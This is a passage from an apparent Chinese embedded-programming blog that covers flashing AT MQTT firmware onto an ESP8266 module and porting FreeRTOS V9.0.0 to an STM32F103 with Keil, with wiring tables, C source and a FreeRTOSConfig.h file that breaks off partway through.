</ul>
<p>下面两幅图分别展示文章使用的 USB 转 TTL 模块以及 ESP8266（ESP-01S）模块。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240401173653.webp" alt="usb-ttl|279"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240401173445.webp" alt="esp8266|475"></p>
<h1>固件与烧录程序下载</h1>
<p>这里以安信可科技固件举例。进入官网的固件下载页：<a href="https://docs.ai-thinker.com/%E5%9B%BA%E4%BB%B6%E6%B1%87%E6%80%BB">AT固件汇总 | 安信可科技 (ai-thinker.com)</a></p>
<p>这两个是可以选择下载的固件，它们的区别是：</p>
<ul>
<li>固件 1112 是 4M 版本的</li>
<li>固件 1471 是 1M 版本的<br>
<img src="https://cdn.gallery.uuanqin.top/img/20240401165810.webp" alt="image.png|500"><br>
<img src="https://cdn.gallery.uuanqin.top/img/20240401165818.webp" alt="image.png|500"></li>
</ul>
<p>根据需要选择一个下载就行。比如我的 ESP8266 不支持 4M 版本的（烧录程序提示烧录失败），这里就下载 1M 的那个。</p>
<p>下载后得到的关键的两个 Bin 文件名分别为：</p>
<ul>
<li>（1112）ESP8266-AT-4M.bin</li>
<li>（1471）ESP8266-AT_MQTT-1M.bin</li>
</ul>
<p>烧录程序为：flash_download_tool。软件可以在搜索引擎中寻找，其界面大致如下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240401170407.webp" alt="image.png|325"></p>
<h1>连线</h1>
<table>
<thead>
<tr>
<th>ESP8266</th>
<th>USB-TTL</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>3V3</td>
<td>5V（不建议）</td>
<td>连接 UST-TTL 的 <code>3V3</code> 口电流不稳定会导致 ESP8266 频繁重启，一般连接<code>5V</code>。而连接 <code>5V</code> 会导致 ESP8266 发烫，有模块烧毁风险。因此建议使用稳定的外部电源供电。这里我使用的就是 STM32 的 3V3 供电。</td>
</tr>
<tr>
<td>GND</td>
<td>GND</td>
<td></td>
</tr>
<tr>
<td>TX</td>
<td>RXD</td>
<td>建议采用直接连接、短线连接的方式以提高成功率。</td>
</tr>
<tr>
<td>RX</td>
<td>TXD</td>
<td>建议采用直接连接、短线连接的方式以提高成功率。</td>
</tr>
<tr>
<td>IO0</td>
<td></td>
<td>暂时悬空。<code>IO0</code> 接地后，模块进入烧写模式。</td>
</tr>
<tr>
<td>RST</td>
<td></td>
<td>暂时悬空。</td>
</tr>
</tbody>
</table>
<h1>烧录</h1>
<p>打开烧录软件，选择 ESP8266。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240401170348.webp" alt="image.png|500"></p>
<p>选择要烧录的固件。固件烧写地址为 0x00。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240401171824.webp" alt="image.png|500"></p>
<p>安照说明和需求进行配置。鼠标悬停会有选项提示。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240401172144.webp" alt="image.png|500"></p>
<p>选择正确的串口 <code>COM</code>。如果你正在使用其它串口助手记得关闭一下对应串口，避免串口占用导致烧录失败。波特率 <code>BAUD</code> 选择越高下载越快。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240401171905.webp" alt="image.png|500"></p>
<p>烧录前保证 ESP8266 的 <code>IO0</code> 口已接地。</p>
<p>点击 START 后开始烧写。若显示等待上电复位，此时请将 ESP8266 模块 <code>RST</code> 引脚接一下地后再次悬空。</p>
<p>出现 FINISH 说明下载完成。</p>
<h1>测试</h1>
<p>关闭烧录软件。将 <code>IO0</code> 引脚悬空或置高。</p>
<p>打开你习惯用的串口助手软件。选择正确的端口和波特率，在不经设置的情况下ESP8266 默认波特率为 115200。发送 AT 指令时记得以回车换行结尾。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240401172745.webp" alt="image.png"></p>
<p>向ESP8266发送命令 <code>AT</code>，正常情况下应返回 <code>OK</code>。</p>
<p>后续就可以进行 MQTT 配置相关测试以验证固件是否烧写成功并正确运行。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/671685854">手把手教你玩转ESP8266（原理+驱动） - 知乎 (zhihu.com)</a></li>
<li><a href="https://blog.csdn.net/Hugo_1st/article/details/91046766">关于ESP8266固件烧写无法上电同步问题的解决办法_esp01s固件烧录等待上电同步-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/CSDNhuaong/article/details/67633566">ESP8266模块接线篇 （正常运行&amp;烧录固件）_esp8266接线图-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/m0_56399733/article/details/134798389">WiFi模块ESP8266(超详细)---(含固件库、AP、STA、原子云使用)_esp8266wifi模块-CSDN博客</a></li>
<li><a href="https://www.bilibili.com/video/BV1Xz4y1n7Uh?p=5&amp;vd_source=e03d48176855fc5349b27aef691f9cdb">第05集 通过at命令的方式控制esp8266发布与订阅消息_哔哩哔哩_bilibili</a></li>
<li><a href="https://blog.csdn.net/weixin_50950983/article/details/124713384">ESP8266 刷MQTT固件以及连接服务器失败的问题解决_mqttdisconnected:0-CSDN博客</a></li>
<li><a href="https://www.cnblogs.com/frozencandles/p/16468361.html">STM32与物联网01-ESP8266基本操作 - 冰封残烛 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://blog.csdn.net/Utotao/article/details/88942864">基于STM32串口通信的ESP8266WiFi模块使用_cipmux and cipserver must be 0-CSDN博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3727808739">
                            <a href="#3727808739">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32+ESP8266+MQTT 实现阿里云温湿度监控及 LED 点灯（FreeRTOS+标准库 or HAL）</span>
                                
                                <div class="record-links-context hover">
                                    <p>首先，固件烧录部分详看：<a href="#2777136240" title="ESP8266 烧写 AT MQTT 固件" class="record-link highlight">ESP8266 烧写 AT MQTT 固件</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2165426052" class="record">
            <header>
                <h1 class="record-title">STM32 移植 FreeRTOS - 基于标准库</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('STM32');">STM32</button>
                    
                    <button class="btn" onclick="activeTag('移植');">移植</button>
                    
                    <button class="btn" onclick="activeTag('FreeRTOS');">FreeRTOS</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                    <button class="btn" onclick="activeTag('Keil');">Keil</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/2/2024</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>标准库下FreeRTOS的移植。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>8111c784</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240404231107.webp</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>这篇文章介绍标准库下将 FreeRTOS 移植到 STM32 的过程。主要内容包括：</p>
<ol>
<li>源码下载与介绍</li>
<li>基础工程从零创建</li>
<li>移植步骤</li>
<li>创建一个任务并点亮 LED 灯</li>
</ol>
<h1>FreeRTOS 源码下载</h1>
<p>下载途径</p>
<ol>
<li>通过 FreeRTOS 官网下载：<a href="https://www.freertos.org/">FreeRTOS - Market leading RTOS (Real Time Operating System) for embedded systems with Internet of Things extensions</a></li>
<li>通过代码托管网站下载：<a href="https://sourceforge.net/projects/freertos/files/FreeRTOS/">FreeRTOS Real Time Kernel (RTOS) - Browse /FreeRTOS at SourceForge.net</a></li>
</ol>
<p>这里我们打算下载 2018 年发布的版本：V9.0.0，因为它的内核稳定，且网上资料较多。我们使用第二种方式进行下载。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402140209.webp" alt="image.png"></p>
<p>选择 zip 格式进行源码下载：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402140406.webp" alt="image.png"></p>
<h1>FreeRTOS 源码结构介绍</h1>
<pre><code class="language-tree">FreeRTOSv9.0.0
├─FreeRTOS
│  ├─Demo # 示例工程
│  │  ├─CORTEX_STM32F103_IAR
│  │  ├─CORTEX_STM32F103_Keil # 针对 Keil 的Demo
│  │  │      FreeRTOSConfig.h # 【Config】
│  │  └─CORTEX_STM32F103_Primer_GCC
│  ├─License # 许可信息
│  │      license.txt
│  └─Source  # 【A】源代码。此层目录下的c文件在不同内核下是通用的。
│      │  croutine.c      # 【Core】
│      │  event_groups.c  # 【Core】
│      │  list.c          # 【Core】
│      │  queue.c         # 【Core】
│      │  tasks.c         # 【Core】
│      │  timers.c        # 【Core】
│      │
│      ├─include
│      │      croutine.h
│      │      deprecated_definitions.h
│      │      event_groups.h
│      │      FreeRTOS.h
│      │      list.h
│      │      mpu_prototypes.h
│      │      mpu_wrappers.h
│      │      portable.h
│      │      projdefs.h
│      │      queue.h
│      │      semphr.h
│      │      StackMacros.h
│      │      stdint.readme
│      │      task.h
│      │      timers.h
│      │
│      └─portable # 【B】端口文件。针对不同的芯片。
│          ├─Keil # 【C】使用 Keil IDE，但它指引我们到 RVDS 中。
│          │      See-also-the-RVDS-directory.txt
│          │
│          ├─MemMang # 【C】内存管理相关文件。我们只需要使用一个方法。
│          │      heap_1.c
│          │      heap_2.c
│          │      heap_3.c
│          │      heap_4.c # 【Port】我们使用这个内存分配算法
│          │      heap_5.c
│          │      ReadMe.url
│          │
│          ├─RVDS # 【C】根据不同的内核进行选择。STM32F103属于CM3内核。
│          │  │
│          │  ├─ARM_CM3 # 与硬件密切相关
│          │  │      port.c # 【Port】由汇编语言编写而成
│          │  │      portmacro.h # 宏定义
......
└─FreeRTOS-Plus # 包含第三方产品。一般我们不需要使用。
</code></pre>
<h1>基础工程构建</h1>
<p>移植前我们需要有一个基础工程。首先构建一个最简单的 STM-32 基于标准库方式开发的工程（详见 <a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link ">STM32 工程的创建 - 基于寄存器或标准库</a>）</p>
<h2>移植 printf</h2>
<p>详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link ">串口驱动程序之「发送数据」</a></p>
<blockquote>
<p>如果你已经移植好可以跳过这一步。这里主要是为了无缝衔接 <a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link ">这篇文章</a>。</p>
</blockquote>
<h2>延时函数</h2>
<p>编写延时函数，将这两个文件放到合适的位置。记得引入到「组」中。这里直接使用 <a href="http://www.prechin.cn/index.html">普中</a> 写好的代码。注意，以前在标准库中使用的延时函数建议成下面的函数。</p>
<p>Systick.h：</p>
<pre><code class="language-c">#ifndef _SysTick_H
#define _SysTick_H
#include &quot;stm32f10x.h&quot;                  // Device header

void SysTick_Init(uint8_t SYSCLK);
void Delay_ms(uint32_t nms);
void Delay_us(uint32_t nus);
void Delay_xms(uint32_t nms);

#endif

</code></pre>
<p>Systick.c：</p>
<pre><code class="language-c">#include &quot;SysTick.h&quot;
#include &quot;FreeRTOS.h&quot;	//FreeRTOS使用		  
#include &quot;task.h&quot;
static uint8_t  fac_us=0;							//us延时倍乘数			   
static uint16_t fac_ms=0;							//ms延时倍乘数


//初始化延迟函数
//SYSTICK的时钟固定为AHB时钟，基础例程里面SYSTICK时钟频率为AHB/8
//SYSCLK:系统时钟频率
void SysTick_Init(uint8_t SYSCLK)
{
	uint32_t reload;
	SysTick_CLKSourceConfig(SysTick_CLKSource_HCLK);//选择外部时钟  HCLK
	fac_us=SystemCoreClock/1000000;				//不论是否使用OS,fac_us都需要使用
	reload=SystemCoreClock/1000000;				//每秒钟的计数次数 单位为M  
	reload*=1000000/configTICK_RATE_HZ;			//根据configTICK_RATE_HZ设定溢出时间
												//reload为24位寄存器,最大值:16777216,在72M下,约合0.233s左右	
	fac_ms=1000/configTICK_RATE_HZ;				//代表OS可以延时的最少单位	   

	SysTick-&gt;CTRL|=SysTick_CTRL_TICKINT_Msk;   	//开启SYSTICK中断
	SysTick-&gt;LOAD=reload; 						//每1/configTICK_RATE_HZ秒中断一次	
	SysTick-&gt;CTRL|=SysTick_CTRL_ENABLE_Msk;   	//开启SYSTICK				   
}								    


//延时nus
//nus:要延时的us数.	
//nus:0~204522252(最大值即2^32/fac_us@fac_us=168)	    								   
void Delay_us(uint32_t nus)
{		
	uint32_t ticks;
	uint32_t told,tnow,tcnt=0;
	uint32_t reload=SysTick-&gt;LOAD;				//LOAD的值	    	 
	ticks=nus*fac_us; 						//需要的节拍数 
	told=SysTick-&gt;VAL;        				//刚进入时的计数器值
	while(1)
	{
		tnow=SysTick-&gt;VAL;	
		if(tnow!=told)
		{	    
			if(tnow&lt;told)tcnt+=told-tnow;	//这里注意一下SYSTICK是一个递减的计数器就可以了.
			else tcnt+=reload-tnow+told;	    
			told=tnow;
			if(tcnt&gt;=ticks)break;			//时间超过/等于要延迟的时间,则退出.
		}  
	};										    
}  
//延时nms
//nms:要延时的ms数
//nms:0~65535
void Delay_ms(uint32_t nms)
{	
	if(xTaskGetSchedulerState()!=taskSCHEDULER_NOT_STARTED)//系统已经运行
	{		
		if(nms&gt;=fac_ms)						//延时的时间大于OS的最少时间周期 
		{ 
   			vTaskDelay(nms/fac_ms);	 		//FreeRTOS延时
		}
		nms%=fac_ms;						//OS已经无法提供这么小的延时了,采用普通方式延时    
	}
	Delay_us((uint32_t)(nms*1000));				//普通方式延时
}

//延时nms,不会引起任务调度
//nms:要延时的ms数
void Delay_xms(uint32_t nms)
{
	uint32_t i;
	for(i=0;i&lt;nms;i++) Delay_us(1000);
}

</code></pre>
<p>进行到这里还不能成功编译，因为 Systick 使用了 FreeRTOS 的函数。</p>
<h1>移植 FreeRTOS</h1>
<p>在项目中新建名为 <code>FreeRTOS</code> 的文件夹。</p>
<ul>
<li>将从往上下载的 FreeRTOS 源码中，标识为【A】的目录下所有内容粘贴到我们新创建的名为 <code>FreeRTOS</code> 的文件夹中。</li>
<li>删除【B】文件夹下，除了【C】之外的所有文件夹。也就是只保留 <code>Keil</code>、<code>MemMang</code> 和 <code>RVDS</code> 这三个文件夹。</li>
</ul>
<p>结果如下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240403000943.webp" alt="image.png"></p>
<p>回到 Keil 中（这里沿用 <a href="http://www.prechin.cn/index.html">普中</a> 的风格）：</p>
<ul>
<li>新建组 <code>FreeRTOS_core</code>：
<ul>
<li>添加【Core】标记的 <code>.c</code> 文件，共 6 个。</li>
</ul>
</li>
<li>新建组 <code>FreeRTOS_port</code>：
<ul>
<li>添加【Port】标记的 <code>.c</code> 文件，共 2 个。</li>
</ul>
</li>
</ul>
<p>添加头文件路径：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240403000740.webp" alt="image.png|500"></p>
<h1>编写配置文件及必要代码修改</h1>
<blockquote>
<p>这部分属于 <a href="http://www.prechin.cn/index.html">普中</a> 的风格。</p>
</blockquote>
<p>在 <code>FreeRTOS/include</code> 中新增一个名为 <code>FreeRTOSConfig.h</code> 的文件，文件内容过长，我放到文章尾。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240403001032.webp" alt="image.png"></p>
<p>使用这个移植文件后，还不能编译成功，会提示两个重定义错误。这是由于 <code>FreeRTOSConfig.h</code> 配置文件中定义了两个冲突的宏。我们还需要进行以下操作。打开 <code>stm32f10x_it.c</code> 注释这两个函数：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240403121402.webp" alt="image.png|500"></p>
<p>解释：<code>SVC_Handler</code> 和 <code>PendSV_Handler</code> 这两个中断函数在 FreeRTOS 中已经定义，但 <code>stm32f10x_it.c</code> 这两个函数是空的。我们这里就使用 FreeRTOS 官方提供的函数。</p>
<p>然后还是在 <code>stm32f10x_it.c</code> 顶上添加两个头文件：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240403121713.webp" alt="image.png|500"></p>
<p>编写 <code>SysTick_Handler</code> 函数：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240403121731.webp" alt="image.png|500"></p>
<p>解释：SysTick 是 FreeRTOS 的心跳时钟，我们这里需要实现它。</p>
<p>编译一下，这时候就没有错误产生了。</p>
<h1>创建任务点亮 LED 灯</h1>
<p>main.c：</p>
<pre><code class="language-c">#include &quot;stm32f10x.h&quot;                  // Device header
#include &quot;serial.h&quot;
#include &quot;SysTick.h&quot;
#include &quot;FreeRTOS.h&quot;
#include &quot;task.h&quot;

//任务优先级
#define START_TASK_PRIO		1
//任务堆栈大小	
#define START_STK_SIZE 		128  
//任务句柄
TaskHandle_t StartTask_Handler;
//任务函数
void start_task(void *pvParameters);

//任务优先级
#define LED_TASK_PRIO		2
//任务堆栈大小	
#define LED_STK_SIZE 		50  
//任务句柄
TaskHandle_t LEDTask_Handler;
//任务函数
void led_task(void *pvParameters);

int main(void){
	SysTick_Init(72);
	
	// 初始化 GPIO
	RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOC,ENABLE); 
	GPIO_InitTypeDef GPIO_InitStructure;
	GPIO_InitStructure.GPIO_Mode=GPIO_Mode_Out_PP; // 推挽
	GPIO_InitStructure.GPIO_Pin=GPIO_Pin_13;
	GPIO_InitStructure.GPIO_Speed=GPIO_Speed_50MHz;
	GPIO_Init(GPIOC,&amp;GPIO_InitStructure);
	
	//创建开始任务
    xTaskCreate((TaskFunction_t )start_task,            //任务函数
                (const char*    )&quot;start_task&quot;,          //任务名称
                (uint16_t       )START_STK_SIZE,        //任务堆栈大小
                (void*          )NULL,                  //传递给任务函数的参数
                (UBaseType_t    )START_TASK_PRIO,       //任务优先级
                (TaskHandle_t*  )&amp;StartTask_Handler);   //任务句柄              
    vTaskStartScheduler();          //开启任务调度
}


//开始任务任务函数
void start_task(void *pvParameters)
{
    taskENTER_CRITICAL();           //进入临界区

	//创建任务指示灯任务
    xTaskCreate((TaskFunction_t )led_task,     
                (const char*    )&quot;led_task&quot;,   
                (uint16_t       )LED_STK_SIZE, 
                (void*          )NULL,
                (UBaseType_t    )LED_TASK_PRIO,
                (TaskHandle_t*  )&amp;LEDTask_Handler); 
				
    vTaskDelete(StartTask_Handler); //删除开始任务
    taskEXIT_CRITICAL();            //退出临界区
} 

void led_task(void *pvParameters)
{
    while(1)
    {
        GPIO_SetBits(GPIOC,GPIO_Pin_13);
        vTaskDelay(200);

        GPIO_ResetBits(GPIOC,GPIO_Pin_13);
        vTaskDelay(800);
    }
}

</code></pre>
<p>编译通过后下载即可。</p>
<h1>附件</h1>
<h2>FreeRTOS 配置文件</h2>
<blockquote>
<p>这个文件其实就是源码包中示例程序存在的文件（标记为【Config】），用户需要自己添加和编写以确定 FreeRTOS 激活或关闭某些功能，从而达到 FreeRTOS 可裁剪的目的。这个文件是我根据普中给的配置进行的改编，去掉不必要的头文件。</p>
</blockquote>
<p><code>FreeRTOSConfig.h</code> 文件内容为：</p>
<pre><code class="language-c">/*
    FreeRTOS V9.0.0 - Copyright (C) 2016 Real Time Engineers Ltd.
    All rights reserved

    VISIT http://www.FreeRTOS.org TO ENSURE YOU ARE USING THE LATEST VERSION.

    This file is part of the FreeRTOS distribution.

    FreeRTOS is free software; you can redistribute it and/or modify it under
    the terms of the GNU General Public License (version 2) as published by the
    Free Software Foundation &gt;&gt;&gt;&gt; AND MODIFIED BY &lt;&lt;&lt;&lt; the FreeRTOS exception.

    ***************************************************************************
    &gt;&gt;!   NOTE: The modification to the GPL is included to allow you to     !&lt;&lt;
    &gt;&gt;!   distribute a combined work that includes FreeRTOS without being   !&lt;&lt;
    &gt;&gt;!   obliged to provide the source code for proprietary components     !&lt;&lt;
    &gt;&gt;!   outside of the FreeRTOS kernel.                                   !&lt;&lt;
    ***************************************************************************

    FreeRTOS is distributed in the hope that it will be useful, but WITHOUT ANY
    WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
    FOR A PARTICULAR PURPOSE.  Full license text is available on the following
    link: http://www.freertos.org/a00114.html

    ***************************************************************************
     *                                                                       *
     *    FreeRTOS provides completely free yet professionally developed,    *
     *    robust, strictly quality controlled, supported, and cross          *
     *    platform software that is more than just the market leader, it     *
     *    is the industry's de facto standard.                               *
     *                                                                       *
     *    Help yourself get started quickly while simultaneously helping     *
     *    to support the FreeRTOS project by purchasing a FreeRTOS           *
     *    tutorial book, reference manual, or both:                          *
     *    http://www.FreeRTOS.org/Documentation                              *
     *                                                                       *
    ***************************************************************************

    http://www.FreeRTOS.org/FAQHelp.html - Having a problem?  Start by reading
    the FAQ page &quot;My application does not run, what could be wrong?&quot;.  Have you
    defined configASSERT()?

    http://www.FreeRTOS.org/support - In return for receiving this top quality
    embedded software for free we request you assist our global community by
    participating in the support forum.

    http://www.FreeRTOS.org/training - Investing in training allows your team to
    be as productive as possible as early as possible.  Now you can receive
    FreeRTOS training directly from Richard Barry, CEO of Real Time Engineers
    Ltd, and the world's leading authority on the world's leading RTOS.

    http://www.FreeRTOS.org/plus - A selection of FreeRTOS ecosystem products,
    including FreeRTOS+Trace - an indispensable productivity tool, a DOS
    compatible FAT file system, and our tiny thread aware UDP/IP stack.

    http://www.FreeRTOS.org/labs - Where new FreeRTOS products go to incubate.
    Come and try FreeRTOS+TCP, our new open source TCP/IP stack for FreeRTOS.

    http://www.OpenRTOS.com - Real Time Engineers ltd. license FreeRTOS to High
    Integrity Systems ltd. to sell under the OpenRTOS brand.  Low cost OpenRTOS
    licenses offer ticketed support, indemnification and commercial middleware.

    http://www.SafeRTOS.com - High Integrity Systems also provide a safety
    engineered and independently SIL3 certified version for use in safety and
    mission critical applications that require provable dependability.

*/


#ifndef FREERTOS_CONFIG_H
#define FREERTOS_CONFIG_H

#include &quot;serial.h&quot; # printf 所在


//针对不同的编译器调用不同的stdint.h文件
#if defined(__ICCARM__) || defined(__CC_ARM) || defined(__GNUC__)
    #include &lt;stdint.h&gt;
    extern uint32_t SystemCoreClock;
#endif

//断言
#define vAssertCalled(char,int) printf(&quot;Error:%s,%d\r\n&quot;,char,int)
#define configASSERT(x) if((x)==0) vAssertCalled(__FILE__,__LINE__)

/************************************************************************
 *               FreeRTOS基础配置配置选项 
 *********************************************************************/
/* 置1：RTOS使用抢占式调度器；置0：RTOS使用协作式调度器（时间片）
 * 
 * 注：在多任务管理机制上，操作系统可以分为抢占式和协作式两种。
 * 协作式操作系统是任务主动释放CPU后，切换到下一个任务。
 * 任务切换的时机完全取决于正在运行的任务。
 */
#define configUSE_PREEMPTION					  1

//1使能时间片调度(默认式使能的)
#define configUSE_TIME_SLICING					1		

/* 某些运行FreeRTOS的硬件有两种方法选择下一个要执行的任务：
 * 通用方法和特定于硬件的方法（以下简称“特殊方法”）。
 * 
 * 通用方法：
 *      1.configUSE_PORT_OPTIMISED_TASK_SELECTION 为 0 或者硬件不支持这种特殊方法。
 *      2.可以用于所有FreeRTOS支持的硬件
 *      3.完全用C实现，效率略低于特殊方法。
 *      4.不强制要求限制最大可用优先级数目
 * 特殊方法：
 *      1.必须将configUSE_PORT_OPTIMISED_TASK_SELECTION设置为1。
 *      2.依赖一个或多个特定架构的汇编指令（一般是类似计算前导零[CLZ]指令）。
 *      3.比通用方法更高效
 *      4.一般强制限定最大可用优先级数目为32
 * 一般是硬件计算前导零指令，如果所使用的，MCU没有这些硬件指令的话此宏应该设置为0！
 */
#define configUSE_PORT_OPTIMISED_TASK_SELECTION	        1                       
                                                                        
/* 置1：使能低功耗tickless模式；置0：保持系统节拍（tick）中断一直运行
 * 假设开启低功耗的话可能会导致下载出现问题，因为程序在睡眠中,可用以下办法解决
 * 
 * 下载方法：
 *      1.将开发版正常连接好
 *      2.按住复位按键，点击下载瞬间松开复位按键
 *     
 *      1.通过跳线帽将 BOOT 0 接高电平(3.3V)
 *      2.重新上电，下载
 *    
 * 			1.使用FlyMcu擦除一下芯片，然后进行下载
 *			STMISP -&gt; 清除芯片(z)
 */
#define configUSE_TICKLESS_IDLE		0   

/*
 * 写入实际的CPU内核时钟频率，也就是CPU指令执行频率，通常称为Fclk
 * Fclk为供给CPU内核的时钟信号，我们所说的cpu主频为 XX MHz，
 * 就是指的这个时钟信号，相应的，1/Fclk即为cpu时钟周期；
 */
#define configCPU_CLOCK_HZ						  (SystemCoreClock)

//RTOS系统节拍中断的频率。即一秒中断的次数，每次中断RTOS都会进行任务调度
#define configTICK_RATE_HZ						  (( TickType_t )1000)

//可使用的最大优先级
#define configMAX_PRIORITIES					  (32)

//空闲任务使用的堆栈大小
#define configMINIMAL_STACK_SIZE				((unsigned short)128)
  
//任务名字字符串长度
#define configMAX_TASK_NAME_LEN					(16)

 //系统节拍计数器变量数据类型，1表示为16位无符号整形，0表示为32位无符号整形
#define configUSE_16_BIT_TICKS					0                      

//空闲任务放弃CPU使用权给其他同优先级的用户任务
#define configIDLE_SHOULD_YIELD					1           

//启用队列
#define configUSE_QUEUE_SETS					  0    

//开启任务通知功能，默认开启
#define configUSE_TASK_NOTIFICATIONS    1   

//使用互斥信号量
#define configUSE_MUTEXES						    1    

//使用递归互斥信号量                                            
#define configUSE_RECURSIVE_MUTEXES			0   

//为1时使用计数信号量
#define configUSE_COUNTING_SEMAPHORES		1

/* 设置可以注册的信号量和消息队列个数 */
#define configQUEUE_REGISTRY_SIZE				10                                 
                                                                       
#define configUSE_APPLICATION_TASK_TAG		  0                       
                      

/*****************************************************************
              FreeRTOS与内存申请有关配置选项                                               
*****************************************************************/
//支持动态内存申请
#define configSUPPORT_DYNAMIC_ALLOCATION        1    
//支持静态内存
#define configSUPPORT_STATIC_ALLOCATION					0					
//系统所有总的堆大小
#define configTOTAL_HEAP_SIZE					((size_t)(10*1024)) // ME:需要修改才能通过编译   


/***************************************************************
             FreeRTOS与钩子函数有关的配置选项                                            
**************************************************************/
/* 置1：使用空闲钩子（Idle Hook类似于回调函数）；置0：忽略空闲钩子
 * 
 * 空闲任务钩子是一个函数，这个函数由用户来实现，
 * FreeRTOS规定了函数的名字和参数：void vApplicationIdleHook(void )，
 * 这个函数在每个空闲任务周期都会被调用
 * 对于已经删除的RTOS任务，空闲任务可以释放分配给它们的堆栈内存。
 * 因此必须保证空闲任务可以被CPU执行
 * 使用空闲钩子函数设置CPU进入省电模式是很常见的
 * 不可以调用会引起空闲任务阻塞的API函数
 */
#define configUSE_IDLE_HOOK						0      

/* 置1：使用时间片钩子（Tick Hook）；置0：忽略时间片钩子
 * 
 * 
 * 时间片钩子是一个函数，这个函数由用户来实现，
 * FreeRTOS规定了函数的名字和参数：void vApplicationTickHook(void )
 * 时间片中断可以周期性的调用
 * 函数必须非常短小，不能大量使用堆栈，
 * 不能调用以”FromISR&quot; 或 &quot;FROM_ISR”结尾的API函数
 */
 /*xTaskIncrementTick函数是在xPortSysTickHandler中断函数中被调用的。因此，vApplicationTickHook()函数执行的时间必须很短才行*/
#define configUSE_TICK_HOOK						0           

//使用内存申请失败钩子函数
#define configUSE_MALLOC_FAILED_HOOK			0 

/*
 * 大于0时启用堆栈溢出检测功能，如果使用此功能 
 * 用户必须提供一个栈溢出钩子函数，如果使用的话
 * 此值可以为1或者2，因为有两种栈溢出检测方法 */
#define configCHECK_FOR_STACK_OVERFLOW			0   


/********************************************************************
          FreeRTOS与运行时间和任务状态收集有关的配置选项   
**********************************************************************/
//启用运行时间统计功能
#define configGENERATE_RUN_TIME_STATS	        0             
 //启用可视化跟踪调试
#define configUSE_TRACE_FACILITY				      0    
/* 与宏configUSE_TRACE_FACILITY同时为1时会编译下面3个函数
 * prvWriteNameToBuffer()
 * vTaskList(),
 * vTaskGetRunTimeStats()
*/
#define configUSE_STATS_FORMATTING_FUNCTIONS	1                       
                                                                        
//extern volatile uint32_t CPU_RunTime;

//#define portCONFIGURE_TIMER_FOR_RUN_TIME_STATS()	(CPU_RunTime=0ul)
//#define portGET_RUN_TIME_COUNTER_VALUE()	CPU_RunTime


/********************************************************************
                FreeRTOS与协程有关的配置选项                                                
*********************************************************************/
//启用协程，启用协程以后必须添加文件croutine.c
#define configUSE_CO_ROUTINES 			          0                 
//协程的有效优先级数目
#define configMAX_CO_ROUTINE_PRIORITIES       ( 2 )                   


/***********************************************************************
                FreeRTOS与软件定时器有关的配置选项      
**********************************************************************/
 //启用软件定时器
#define configUSE_TIMERS				            1                              
//软件定时器优先级
#define configTIMER_TASK_PRIORITY		        (configMAX_PRIORITIES-1)        
//软件定时器队列长度
#define configTIMER_QUEUE_LENGTH		        10                               
//软件定时器任务堆栈大小
#define configTIMER_TASK_STACK_DEPTH	      (configMINIMAL_STACK_SIZE*2)    

/************************************************************
            FreeRTOS可选函数配置选项                                                     
************************************************************/
#define INCLUDE_xTaskGetSchedulerState       1                       
#define INCLUDE_vTaskPrioritySet		         1
#define INCLUDE_uxTaskPriorityGet		         1
#define INCLUDE_vTaskDelete				           1
#define INCLUDE_vTaskCleanUpResources	       1
#define INCLUDE_vTaskSuspend			           1
#define INCLUDE_vTaskDelayUntil			         1
#define INCLUDE_vTaskDelay				           1
#define INCLUDE_eTaskGetState			           1
#define INCLUDE_xTimerPendFunctionCall	     0
//#define INCLUDE_xTaskGetCurrentTaskHandle       1
//#define INCLUDE_uxTaskGetStackHighWaterMark     0
//#define INCLUDE_xTaskGetIdleTaskHandle          0


/******************************************************************
            FreeRTOS与中断有关的配置选项                                                 
******************************************************************/
#ifdef __NVIC_PRIO_BITS
	#define configPRIO_BITS       		__NVIC_PRIO_BITS
